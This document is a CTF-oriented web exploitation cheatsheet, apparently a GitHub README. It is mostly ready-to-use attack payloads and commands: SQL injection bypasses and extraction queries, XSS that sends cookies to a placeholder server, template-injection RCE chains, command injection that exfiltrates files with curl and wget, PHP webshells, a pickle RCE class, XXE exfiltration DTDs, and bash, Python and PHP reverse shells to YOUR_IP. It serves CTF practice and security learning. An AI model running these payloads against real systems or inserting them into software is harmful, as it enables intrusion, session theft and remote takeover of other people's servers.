# 🌐 Ultimate Web Exploitation CTF Cheatsheet

<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=26&duration=3000&pause=1000&color=FF3333&center=true&vCenter=true&repeat=true&width=750&height=80&lines=Ultimate+Web+Exploitation+CTF+Notes+%F0%9F%8C%90;Every+Vuln+%7C+Every+Payload+%7C+Every+Trick;By+Nithishkumar+S+%E2%80%94+National+CTF+Finalist" alt="Typing SVG" />

![Web](https://img.shields.io/badge/Web-Exploitation-ff3333?style=for-the-badge&logo=owasp&logoColor=white)
![SQLi](https://img.shields.io/badge/SQLi-cc0000?style=for-the-badge&logo=mysql&logoColor=white)
![XSS](https://img.shields.io/badge/XSS-ff6600?style=for-the-badge&logo=javascript&logoColor=white)
![SSTI](https://img.shields.io/badge/SSTI-ff0066?style=for-the-badge&logo=jinja&logoColor=white)
![JWT](https://img.shields.io/badge/JWT-000000?style=for-the-badge&logo=jsonwebtokens&logoColor=white)
![SSRF](https://img.shields.io/badge/SSRF-6633cc?style=for-the-badge&logo=curl&logoColor=white)

**The only web CTF reference you'll ever need. From recon to RCE.**

</div>

---

## 📑 Table of Contents

| # | Topic | # | Topic |
|---|-------|---|-------|
| 1 | [Reconnaissance & Enumeration](#1--reconnaissance--enumeration) | 11 | [Insecure Deserialization](#11--insecure-deserialization) |
| 2 | [SQL Injection (SQLi)](#2--sql-injection-sqli) | 12 | [XML External Entity (XXE)](#12--xml-external-entity-xxe) |
| 3 | [Cross-Site Scripting (XSS)](#3--cross-site-scripting-xss) | 13 | [Server-Side Request Forgery (SSRF)](#13--server-side-request-forgery-ssrf) |
| 4 | [Server-Side Template Injection (SSTI)](#4--server-side-template-injection-ssti) | 14 | [File Upload Vulnerabilities](#14--file-upload-vulnerabilities) |
| 5 | [Command Injection](#5--command-injection) | 15 | [Authentication & Session Attacks](#15--authentication--session-attacks) |
| 6 | [Path Traversal & LFI/RFI](#6--path-traversal--lfirfi) | 16 | [JWT Attacks](#16--jwt-attacks) |
| 7 | [Cross-Site Request Forgery (CSRF)](#7--cross-site-request-forgery-csrf) | 17 | [Race Conditions](#17--race-conditions) |
| 8 | [IDOR & Broken Access Control](#8--idor--broken-access-control) | 18 | [WebSocket Attacks](#18--websocket-attacks) |
| 9 | [Open Redirect](#9--open-redirect) | 19 | [GraphQL Attacks](#19--graphql-attacks) |
| 10 | [HTTP Request Smuggling](#10--http-request-smuggling) | 20 | [Useful One-Liners & Scripts](#20--useful-one-liners--scripts) |

---

## 1 — Reconnaissance & Enumeration

### 🔹 Directory & File Brute Force

```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,old,json,xml,js
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Feroxbuster (recursive)
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt

# Dirsearch
dirsearch -u http://target.com -e php,html,js,txt,bak

# FFUF (fastest)
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.html,.bak
```

### 🔹 Subdomain Enumeration

```bash
ffuf -u http://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200
subfinder -d target.com
amass enum -passive -d target.com
```

### 🔹 Hidden Files & Info Leaks — Always Check These!

```bash
# ALWAYS try these URLs first in any web CTF
/robots.txt
/sitemap.xml
/.git/HEAD
/.git/config
/.env
/.DS_Store
/backup.zip
/backup.tar.gz
/config.php.bak
/admin/
/debug
/server-status
/server-info
/.well-known/
/swagger.json
/api/docs
/graphql
/wp-config.php.bak
/.htaccess
/crossdomain.xml
/package.json
/composer.json

# Git dump (if /.git/ exists)
git-dumper http://target.com/.git/ ./git-output
cd git-output && git log --oneline
git show <commit-hash>
git diff HEAD~1
```

### 🔹 Technology Detection

```bash
whatweb http://target.com
curl -I http://target.com              # check headers
curl -s http://target.com | grep -i "generator\|powered\|framework"
```

### 🔹 Parameter Discovery

```bash
# Find hidden parameters
arjun -u http://target.com/page
paramspider -d target.com
ffuf -u "http://target.com/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs <default-size>
```

---

## 2 — SQL Injection (SQLi)

### 🔹 Detection

```
' → error = possible SQLi
'' → no error = confirms SQLi
' OR 1=1-- → bypass
' AND 1=2-- → no results = injectable
" OR ""="
') OR ('1'='1
```

### 🔹 Authentication Bypass

```sql
admin' --
admin' #
admin'/*
' OR 1=1 --
' OR '1'='1' --
" OR 1=1 --
' OR 1=1#
') OR ('1'='1
admin' OR '1'='1
' UNION SELECT 1,'admin','password' --
```

### 🔹 UNION-Based SQLi

```sql
-- Step 1: Find number of columns
' ORDER BY 1-- ✅
' ORDER BY 2-- ✅
' ORDER BY 3-- ✅
' ORDER BY 4-- ❌  → 3 columns

-- Step 2: Find visible columns
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
' UNION SELECT NULL,NULL,NULL--

-- Step 3: Extract info (MySQL)
' UNION SELECT database(),user(),version()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,NULL FROM users--

-- Step 3: Extract info (PostgreSQL)
' UNION SELECT current_database(),current_user,version()--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--

-- Step 3: Extract info (SQLite)
' UNION SELECT sql,NULL,NULL FROM sqlite_master--
' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT username,password,NULL FROM users--

-- Read files (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--
```

### 🔹 Blind SQLi — Boolean-Based

```sql
-- True / False test
' AND 1=1-- (true → normal page)
' AND 1=2-- (false → different page)

-- Extract database name char by char
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--
' AND ASCII(SUBSTRING(database(),1,1))>96--
' AND ASCII(SUBSTRING(database(),1,1))=100--  → 'd'

-- Extract table names
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--

-- Extract data
' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='a'--
```

### 🔹 Blind SQLi — Time-Based

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- SQLite
' AND CASE WHEN (1=1) THEN RANDOMBLOB(100000000) ELSE 0 END--

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### 🔹 SQLMap Cheatsheet

```bash
# Basic
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# From Burp request file
sqlmap -r request.txt --batch --level=5 --risk=3

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" -p user

# Cookie-based
sqlmap -u "http://target.com/page" --cookie="session=abc123" --level=2

# Tamper scripts (WAF bypass)
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# File read/write
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### 🔹 WAF Bypass Tricks

```sql
-- Case manipulation
uNiOn SeLeCt 1,2,3--

-- Comment injection
UN/**/ION SEL/**/ECT 1,2,3--
/*!50000UNION*/+/*!50000SELECT*/+1,2,3--

-- URL encoding
%55%4e%49%4f%4e%20%53%45%4c%45%43%54
%27%20OR%201%3D1--

-- Double URL encoding
%2527%20OR%201%253D1--

-- Null bytes
%00' UNION SELECT 1,2,3--

-- Inline comments (MySQL)
1'/*!UNION*//*!SELECT*/1,2,3--

-- No spaces
'UNION(SELECT(1),(2),(3))--
```

### 🔹 NoSQL Injection

```json
// MongoDB Auth Bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$exists": true}}

// URL params
username[$ne]=&password[$ne]=
username=admin&password[$regex]=.*
username=admin&password[$gt]=
```

---

## 3 — Cross-Site Scripting (XSS)

### 🔹 Reflected XSS

```html
<!-- Basic payloads -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Event handlers -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<iframe onload=alert('XSS')>
```

### 🔹 Stored XSS

```html
<!-- Comment/profile fields -->
<script>fetch('https://YOUR-SERVER.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://YOUR-SERVER.com/?c='+document.cookie)">
<script>new Image().src='https://YOUR-SERVER.com/?c='+document.cookie</script>
```

### 🔹 DOM XSS

```
# Check these sinks in JS source code
document.write()
innerHTML
outerHTML
eval()
setTimeout()
setInterval()
document.location
window.location
location.href
location.hash
location.search

# Payloads via URL fragment
http://target.com/page#<img src=x onerror=alert('XSS')>
http://target.com/page?q=<script>alert('XSS')</script>
```

### 🔹 Filter Bypass Techniques

```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x OnErRoR=alert('XSS')>

<!-- Double encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- Nested tags -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>

<!-- Without parentheses -->
<img src=x onerror=alert`XSS`>
<svg onload=alert`XSS`>

<!-- Without alert keyword -->
<img src=x onerror=confirm('XSS')>
<img src=x onerror=prompt('XSS')>
<img src=x onerror="top['al'+'ert']('XSS')">

<!-- Without quotes -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

<!-- JavaScript protocol -->
<a href="javascript:alert('XSS')">Click</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')">Click</a>

<!-- SVG -->
<svg><script>alert('XSS')</script></svg>
<svg><animate onbegin=alert('XSS') attributeName=x>

<!-- Using eval + base64 -->
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">

<!-- Without < > (inside attribute context) -->
" onfocus=alert('XSS') autofocus="
" onmouseover=alert('XSS') "

<!-- Polyglot XSS -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

### 🔹 Cookie Stealing Server

```bash
# Start listener to catch cookies
python3 -m http.server 8080
# or use webhook.site / requestbin.com

# Payload
<script>fetch('https://YOUR-SERVER.com/steal?cookie='+btoa(document.cookie))</script>
```

---

## 4 — Server-Side Template Injection (SSTI)

### 🔹 Detection

```
# Test these in input fields / URL params
{{7*7}}         → 49 (Jinja2, Twig)
${7*7}          → 49 (Freemarker, Velocity)
<%= 7*7 %>      → 49 (ERB - Ruby)
#{7*7}          → 49 (Thymeleaf, Pug)
{{7*'7'}}       → 7777777 (Jinja2) / 49 (Twig)
${{7*7}}        → 49 (Thymeleaf)
@(1+1)          → 2 (Razor .NET)
```

### 🔹 Jinja2 (Python / Flask) — Most Common in CTFs

```python
# Config dump
{{config}}
{{config.items()}}
{{request.environ}}

# RCE — Method 1: os.popen
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# RCE — Method 2: cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# RCE — Method 3: lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# RCE — Method 4: namespace
{{namespace.__init__.__globals__.os.popen('cat /flag.txt').read()}}

# RCE — Method 5: config
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

# Read flag directly (find file reader class)
{{''.__class__.__mro__[1].__subclasses__()}}
# Find index of _io.FileIO or open
{{''.__class__.__mro__[1].__subclasses__()[X]('/flag.txt').read()}}

# Bypass filters — no underscores
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Bypass filters — no dots (bracket notation)
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}

# Bypass filters — using |attr()
{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}

# Bypass filters — hex encode underscores
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
```

### 🔹 Twig (PHP)

```php
# RCE
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Newer Twig
{{['id']|filter('system')}}
{{['cat /flag.txt']|filter('system')}}

# File read
{{'/etc/passwd'|file_excerpt(0,100)}}
```

### 🔹 ERB (Ruby)

```ruby
<%= system('id') %>
<%= `cat /flag.txt` %>
<%= IO.popen('id').read %>
```

### 🔹 Freemarker (Java)

```java
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}
```

### 🔹 Handlebars (Node.js)

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id')"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## 5 — Command Injection

### 🔹 Basic Payloads

```bash
# Chaining commands
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid

# Example: ping parameter
127.0.0.1; cat /flag.txt
127.0.0.1 | cat /flag.txt
127.0.0.1 && cat /flag.txt
```

### 🔹 Blind Command Injection

```bash
# Time-based detection
; sleep 5
| sleep 5

# Out-of-band (OOB)
; curl http://YOUR-SERVER.com/$(whoami)
; wget http://YOUR-SERVER.com/$(cat /flag.txt | base64)
; nslookup $(whoami).YOUR-SERVER.com

# Write to web root
; id > /var/www/html/output.txt
```

### 🔹 Filter Bypass

```bash
# No spaces
{cat,/flag.txt}
cat${IFS}/flag.txt
cat$IFS$9/flag.txt
cat</flag.txt

# Blacklisted commands
c'a't /flag.txt
c""at /flag.txt
c\at /flag.txt
/bin/c?t /flag.txt
/bin/ca* /flag.txt

# Wildcard bypass
/???/??t /???g.txt       # → /bin/cat /flag.txt

# Base64 encoded
echo Y2F0IC9mbGFnLnR4dA== | base64 -d | bash

# Variable trick
a=c;b=at;$a$b /flag.txt

# Reverse
echo 'txt.galf/ tac' | rev | bash
```

---

## 6 — Path Traversal & LFI/RFI

### 🔹 Basic Path Traversal

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd     # double encode
..%c0%afetc/passwd                  # unicode bypass
....\/....\/....\/etc/passwd
```

### 🔹 Important Files to Read

```
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/home/<user>/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/.env
/flag.txt
/flag
/app/flag.txt
```

### 🔹 LFI to RCE

```bash
# 1. PHP Wrappers — Read source code
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=flag.php

# 2. PHP Input (RCE)
# URL: http://target.com/page?file=php://input
# POST body: <?php system('cat /flag.txt'); ?>

# 3. Data Wrapper
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# 4. Log Poisoning
# Inject PHP in User-Agent header
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
# Include log file
http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id

# 5. Zip / Phar Wrapper
zip://uploads/shell.zip%23shell.php
phar://uploads/shell.phar/shell.php

# 6. Expect Wrapper
expect://id
```

### 🔹 RFI (Remote File Inclusion)

```
http://target.com/page?file=http://YOUR-SERVER.com/shell.txt
# shell.txt: <?php system($_GET['cmd']); ?>
```

### 🔹 Null Byte (old PHP < 5.3)

```
../../../etc/passwd%00
../../../etc/passwd%00.php
```

---

## 7 — Cross-Site Request Forgery (CSRF)

### 🔹 Auto-Submit Form

```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://target.com/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
  </form>
</body>
</html>
```

### 🔹 GET-Based CSRF

```html
<img src="http://target.com/transfer?to=attacker&amount=10000" width="0" height="0">
```

### 🔹 Fetch CSRF (JSON)

```html
<script>
fetch('http://target.com/api/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil.com'
});
</script>
```

### 🔹 CSRF Token Bypass Checklist

```
1. Remove the token parameter entirely
2. Use empty token value: csrf_token=
3. Use another user's token
4. Change POST to GET
5. Try older/reused tokens
6. Swap token from another form
7. Decode token — is it predictable?
```

---

## 8 — IDOR & Broken Access Control

### 🔹 IDOR

```
GET /api/user/1001  →  /api/user/1002  →  /api/user/1
GET /invoice?id=500  →  /invoice?id=501
{"user_id": 1001}  →  {"user_id": 1}

# Try: encoded IDs, negative numbers, zero, UUIDs leaked in responses
```

### 🔹 403 Bypass Techniques

```
/admin → 403
/Admin → 200?
/admin/ → 200?
/admin/. → 200?
/./admin → 200?
/admin%20 → 200?
/%2fadmin → 200?

# Header tricks
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1

# Method change
GET → POST → PUT → PATCH
```

---

## 9 — Open Redirect

```
# Common parameters
?url=  ?redirect=  ?next=  ?dest=  ?return=  ?goto=  ?continue=

# Payloads
https://target.com/redirect?url=https://evil.com
//evil.com
https://target.com@evil.com
https://evil.com.target.com
https://evil.com%23.target.com
https://evil.com?.target.com
```

---

## 10 — HTTP Request Smuggling

### 🔹 CL.TE

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### 🔹 TE.CL

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

---

## 11 — Insecure Deserialization

### 🔹 Python Pickle RCE

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

### 🔹 PHP Deserialization

```bash
# Look for unserialize() — magic methods: __wakeup(), __destruct(), __toString()
# Use PHPGGC for known gadget chains
phpggc Laravel/RCE1 system "cat /flag.txt" -b
phpggc Symfony/RCE4 exec "cat /flag.txt" -b
```

### 🔹 Java Deserialization

```bash
# Signatures: rO0AB (base64) or AC ED 00 05 (hex)
java -jar ysoserial.jar CommonsCollections1 "cat /flag.txt" | base64
```

### 🔹 Node.js (node-serialize)

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('cat /flag.txt')}()"}
```

### 🔹 YAML (PyYAML)

```yaml
!!python/object/apply:os.system ['cat /flag.txt']
```

---

## 12 — XML External Entity (XXE)

### 🔹 Read Files

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### 🔹 Read PHP Source

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root>&xxe;</root>
```

### 🔹 Blind XXE (OOB)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/evil.dtd"> %xxe;]>
<root>test</root>

<!-- evil.dtd on your server -->
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER.com/?data=%file;'>">
%eval;
%exfil;
```

### 🔹 XXE via SVG Upload

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>
```

### 🔹 SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

---

## 13 — Server-Side Request Forgery (SSRF)

### 🔹 Common Internal Targets

```
http://127.0.0.1       http://localhost
http://0.0.0.0         http://[::1]
http://127.0.0.1:6379  (Redis)
http://127.0.0.1:3306  (MySQL)
http://127.0.0.1:27017 (MongoDB)
http://169.254.169.254/latest/meta-data/  (AWS)
```

### 🔹 Localhost Bypass

```
http://0177.0.0.1        # octal
http://2130706433         # decimal
http://0x7f000001         # hex
http://127.1
http://0
```

### 🔹 SSRF → RCE (Gopher + Redis)

```bash
# Use Gopherus tool
python gopherus.py --exploit redis
python gopherus.py --exploit mysql
```

---

## 14 — File Upload Vulnerabilities

### 🔹 PHP Webshells

```php
<?php system($_GET['cmd']); ?>
<?=`$_GET[cmd]`?>
```

### 🔹 Extension Bypass

```
.php3  .php5  .phtml  .phar  .pht  .shtml
shell.php.jpg    shell.jpg.php
shell.php%00.jpg    shell.pHp
shell.php.       shell.php%0a
```

### 🔹 Magic Bytes + PHP

```bash
echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

### 🔹 .htaccess Trick

```apache
# Upload this as .htaccess
AddType application/x-httpd-php .jpg
# Then upload shell.jpg with PHP code
```

---

## 15 — Authentication & Session Attacks

### 🔹 Default Credentials

```
admin:admin    admin:password    admin:123456
root:root      root:toor         test:test
```

### 🔹 Flask Session Cracking

```bash
flask-unsign --decode --cookie "eyJ..."
flask-unsign --unsign --cookie "eyJ..." --wordlist rockyou.txt
flask-unsign --sign --cookie "{'admin': True}" --secret "SECRET_KEY"
```

### 🔹 2FA Bypass

```
1. Response manipulation: "success":false → true
2. Skip 2FA page → directly access dashboard URL
3. Brute force codes
4. Reuse old codes
5. Empty/null code
6. Code leaked in response
```

---

## 16 — JWT Attacks

### 🔹 Algorithm None

```json
// Header: {"alg": "none", "typ": "JWT"}
// Remove signature, keep trailing dot
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### 🔹 Weak Secret Brute Force

```bash
python3 jwt_tool.py <JWT> -C -d rockyou.txt
hashcat -m 16500 jwt.txt rockyou.txt
```

### 🔹 Algorithm Confusion (RS256 → HS256)

```bash
# Sign JWT with public key as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

### 🔹 Kid Injection

```json
{"alg": "HS256", "kid": "../../dev/null"}      // sign with empty string
{"alg": "HS256", "kid": "' UNION SELECT 'secret' --"}  // sign with "secret"
```

### 🔹 jwt_tool Master Commands

```bash
python3 jwt_tool.py <JWT> -T        # tamper claims
python3 jwt_tool.py <JWT> -M at     # all attacks
python3 jwt_tool.py <JWT> -X a      # alg:none
python3 jwt_tool.py <JWT> -X k      # key confusion
```

---

## 17 — Race Conditions

```bash
# Send 50 parallel requests to exploit TOCTOU
for i in $(seq 1 50); do
  curl -s http://target.com/redeem -d "code=DISCOUNT50" &
done
wait

# Burp Suite: Send group in parallel / Turbo Intruder
# Targets: coupon redemption, money transfer, vote manipulation
```

---

## 18 — WebSocket Attacks

```javascript
// Browser console
var ws = new WebSocket('ws://target.com/socket');
ws.onmessage = function(e) { console.log(e.data); };
ws.send('{"action":"getUsers"}');

// Try SQLi, XSS, IDOR in WebSocket messages
{"query": "' OR 1=1--"}
{"message": "<script>alert('XSS')</script>"}
{"userId": 1} → {"userId": 2}
```

---

## 19 — GraphQL Attacks

### 🔹 Introspection (Dump Schema)

```graphql
{ __schema { types { name fields { name type { name } } } } }
```

### 🔹 Common Endpoints

```
/graphql  /graphiql  /v1/graphql  /api/graphql
```

### 🔹 Attacks

```graphql
# IDOR
{ user(id: 1) { name email password } }
{ user(id: 2) { name email password } }

# Dump all users
{ users { id name email password role } }

# SQLi
{ user(id: "1' OR 1=1--") { name } }

# Unauthorized mutation
mutation { updateUser(id:1, role:"admin") { id role } }
```

---

## 20 — Useful One-Liners & Scripts

### 🔹 Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"); ?>

# Listener
nc -lvnp 4444
```

### 🔹 Upgrade to Interactive Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 🔹 Python SQLi Blind Script

```python
import requests, string

url = "http://target.com/login"
flag = ""

for i in range(1, 50):
    for c in string.printable:
        payload = f"' OR SUBSTRING((SELECT password FROM users LIMIT 1),{i},1)='{c}'--"
        r = requests.post(url, data={"username": payload, "password": "x"})
        if "Welcome" in r.text:
            flag += c
            print(f"[+] {flag}")
            break
    else:
        break
print(f"[✓] {flag}")
```

### 🔹 Python Session Script

```python
import requests

s = requests.Session()
s.post('http://target.com/login', data={'username':'admin','password':'password'})
r = s.get('http://target.com/admin/flag')
print(r.text)
```

---

## 🛠️ Essential Web CTF Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept, modify, replay HTTP requests |
| **SQLMap** | Automated SQL injection |
| **ffuf** | Fast web fuzzer (dirs, params, subdomains) |
| **Gobuster** | Directory & DNS brute force |
| **Nikto** | Web vulnerability scanner |
| **jwt_tool** | JWT attack toolkit |
| **flask-unsign** | Flask session decode/crack/forge |
| **Arjun** | Hidden parameter discovery |
| **git-dumper** | Dump exposed .git repos |
| **CyberChef** | Encode/decode/transform anything |
| **Gopherus** | Generate SSRF → RCE payloads |
| **PHPGGC** | PHP deserialization gadget chains |
| **ysoserial** | Java deserialization exploits |
| **PayloadsAllTheThings** | Master payload reference |
| **HackTricks** | Comprehensive hacking methodology |
| **RevShells** | Reverse shell generator |
| **Webhook.site** | Catch OOB callbacks |

---

## 🧠 Web CTF Methodology — Quick Reference

```
┌────────────────────────────────────────────────────────────┐
│                    WEB CTF METHODOLOGY                     │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  STEP 1: RECON                                             │
│    □ View source (Ctrl+U) — check HTML comments            │
│    □ Check /robots.txt  /.git/  /.env  /backup.zip         │
│    □ Inspect cookies — decode base64 / JWT                 │
│    □ Read JS files — find API endpoints & secrets          │
│    □ Run gobuster / ffuf for hidden paths                  │
│    □ curl -I for server headers                            │
│                                                            │
│  STEP 2: IDENTIFY STACK                                    │
│    □ Server: Apache / Nginx / Express / Gunicorn           │
│    □ Language: PHP / Python / Node / Java / Ruby           │
│    □ Framework: Flask / Django / Laravel / Express          │
│                                                            │
│  STEP 3: FIND INPUTS                                       │
│    □ URL parameters  □ POST forms  □ Cookies               │
│    □ Headers  □ File uploads  □ APIs  □ WebSockets         │
│                                                            │
│  STEP 4: TEST VULNS (order of priority)                    │
│    □ SQLi       →  ' " ; --                                │
│    □ XSS        →  <script>alert(1)</script>               │
│    □ SSTI       →  {{7*7}}   ${7*7}                        │
│    □ CMDi       →  ;id   |id   `id`                        │
│    □ LFI        →  ../../etc/passwd                        │
│    □ IDOR       →  change user/object IDs                  │
│    □ JWT        →  decode → alg:none → brute secret        │
│    □ SSRF       →  http://127.0.0.1                        │
│    □ XXE        →  if XML input exists                     │
│    □ Upload     →  PHP shell with extension bypass         │
│    □ Deser      →  check serialized cookies/data           │
│                                                            │
│  STEP 5: GET THE FLAG                                      │
│    □ cat /flag.txt  /flag  env vars  database              │
│    □ Chain vulns for RCE                                   │
│    □ Check source code for hardcoded flags                 │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

---

## 🔗 Learning Resources

| Resource | Link |
|----------|------|
| **PortSwigger Academy** | [portswigger.net/web-security](https://portswigger.net/web-security) |
| **OWASP Top 10** | [owasp.org](https://owasp.org/www-project-top-ten/) |
| **HackTheBox** | [hackthebox.com](https://hackthebox.com) |
| **TryHackMe** | [tryhackme.com](https://tryhackme.com) |
| **PicoCTF** | [picoctf.org](https://picoctf.org) |
| **HackTricks** | [book.hacktricks.xyz](https://book.hacktricks.xyz) |
| **PayloadsAllTheThings** | [github](https://github.com/swisskyrepo/PayloadsAllTheThings) |
| **GTFOBins** | [gtfobins.github.io](https://gtfobins.github.io) |
| **RevShells** | [revshells.com](https://revshells.com) |
| **CyberChef** | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) |

---

<div align="center">

```
  ╔═══════════════════════════════════════════════════════════╗
  ║                                                           ║
